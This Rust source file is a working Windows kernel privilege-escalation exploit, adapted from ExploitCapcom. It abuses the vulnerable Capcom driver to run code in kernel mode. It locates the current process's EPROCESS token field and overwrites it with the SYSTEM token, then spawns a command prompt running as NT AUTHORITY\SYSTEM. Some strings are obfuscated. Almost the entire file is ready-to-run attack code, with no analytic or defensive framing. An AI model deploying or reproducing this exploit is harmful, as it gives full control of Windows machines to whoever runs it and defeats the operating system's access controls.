/*!
Launch an elevated command prompt with NT AUTHORITY\SYSTEM privileges.

Adapted from https://github.com/tandasat/ExploitCapcom
 */

// Only available to 64-bit windows targets.
#![cfg(all(windows, target_pointer_width = "64"))]

use std::{mem, ptr};

use winapi::shared::minwindef::{FALSE};
use winapi::shared::ntdef::{UNICODE_STRING, PVOID, NTSTATUS, HANDLE};
use winapi::um::winnt::{PACCESS_TOKEN};
use winapi::um::winbase::{CREATE_NEW_CONSOLE};
use winapi::um::processthreadsapi::{CreateProcessW, STARTUPINFOW, PROCESS_INFORMATION};
use winapi::um::processenv::{GetCommandLineW};
use winapi::um::shellapi::{CommandLineToArgvW};

use obfstr::wide;

use capcom0::get_system_routine_address;

type PEPROCESS = PVOID;

fn main() {
	let result = capcom0::setup(|_, device| {
		let mut success = false;
		unsafe {
			#[allow(non_snake_case)]
			device.elevate(|ctx| {
				let PsGetCurrentProcessId = get_system_routine_address!(ctx,
					unsafe extern "system" fn() -> HANDLE,
					wide!("PsGetCurrentProcessId"));
				let PsLookupProcessByProcessId = get_system_routine_address!(ctx,
					unsafe extern "system" fn(HANDLE, *mut PEPROCESS) -> NTSTATUS,
					wide!("PsLookupProcessByProcessId"));
				let ObDereferenceObject = get_system_routine_address!(ctx,
					unsafe extern "system" fn(PVOID),
					wide!("ObDereferenceObject"));
				let PsReferencePrimaryToken = get_system_routine_address!(ctx,
					unsafe extern "system" fn(PEPROCESS) -> PACCESS_TOKEN,
					wide!("PsReferencePrimaryToken"));
				let PsDereferencePrimaryToken = get_system_routine_address!(ctx,
					unsafe extern "system" fn(PACCESS_TOKEN),
					wide!("PsDereferencePrimaryToken"));
				let SystemProcess = *get_system_routine_address!(ctx,
					*mut PEPROCESS,
					wide!("PsInitialSystemProcess"));

				// Early safety check...
				if SystemProcess == ptr::null_mut() {
					return;
				}

				// Get the process object of the current process
				let mut CurrentProcess = ptr::null_mut();
				let Status = PsLookupProcessByProcessId(PsGetCurrentProcessId(), &mut CurrentProcess);
				if Status < 0 {
					return;
				}

				let CurrentToken = PsReferencePrimaryToken(CurrentProcess);
				let SystemToken = PsReferencePrimaryToken(SystemProcess);

				// Search the token field from EPROCESS up to a 0x80 pointers size
				for Offset in 0..0x80 {
					let TestAddress = (CurrentProcess as *mut usize).offset(Offset);
					let ProbableToken = (*TestAddress & !0xf) as PACCESS_TOKEN;
					if ProbableToken == CurrentToken {
						let TokenAddress = TestAddress as *mut PACCESS_TOKEN;
						*TokenAddress = SystemToken;
						success = true;
						break;
					}
				}

				PsDereferencePrimaryToken(CurrentToken);
				PsDereferencePrimaryToken(SystemToken);
				ObDereferenceObject(CurrentProcess);
			});
			success
		}
	});
	match result {
		Err(e) => eprintln!("{}", e),
		Ok(true) => {
			if launch() {
				println!("Cmd launched with 'NT AUTHORITY\\SYSTEM' privileges.");
			}
			else {
				eprintln!("Failed to launch the cmd.");
			}
		},
		Ok(false) => {
			eprintln!("Failed to steal the SYSTEM token.");
		},
	}
}

static mut COMMAND_LINE: [u16; 28] = /*C:\Windows\System32\cmd.exe*/[67u16, 58, 92, 87, 105, 110, 100, 111, 119, 115, 92, 115, 121, 115, 116, 101, 109, 51, 50, 92, 99, 109, 100, 46, 101, 120, 101, 0];
fn launch() -> bool {
	unsafe {
		let mut num_args = mem::uninitialized();
		let cmd_args = CommandLineToArgvW(GetCommandLineW(), &mut num_args);

		let app_name = if num_args > 1 { *cmd_args.offset(1) }
		else { COMMAND_LINE.as_mut_ptr() };

		let cmd_line = if num_args > 2 { *cmd_args.offset(2) }
		else { ptr::null_mut() };

		let mut process_info: PROCESS_INFORMATION = mem::uninitialized();
		let mut startup_info: STARTUPINFOW = mem::zeroed();
		startup_info.cb = mem::size_of::<STARTUPINFOW>() as u32;
		let result = CreateProcessW(app_name, cmd_line, ptr::null_mut(), ptr::null_mut(), FALSE, CREATE_NEW_CONSOLE, ptr::null_mut(), ptr::null_mut(), &mut startup_info, &mut process_info) != FALSE;

		// Leak all the resources :)
		return result;
	}
}
